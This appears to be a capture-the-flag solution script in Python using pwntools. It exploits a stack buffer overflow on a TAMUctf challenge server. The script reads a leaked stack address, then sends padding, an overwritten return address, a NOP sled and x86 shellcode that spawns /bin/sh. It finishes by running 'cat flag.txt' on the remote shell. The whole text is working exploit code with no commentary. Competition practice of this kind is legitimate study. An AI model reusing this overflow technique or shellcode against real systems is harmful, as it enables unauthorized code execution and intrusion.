from pwn import *

#: Connect to challenge server
HOST = 'pwn.tamuctf.com'
PORT = 4323
p = remote(HOST,PORT)

# #: Get the esp provided
prompt = p.recv()
print(prompt)
stack = int(prompt.split()[-1][:-1], 16)

#: Exploit code
offset = 'A' * 302
esp = p32(stack + 311)
nopsled = '\x90' * 10
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80'
exploit = offset + esp + nopsled + shellcode

#: Send data
p.sendline(exploit)
p.sendline('cat flag.txt')
print(p.recv())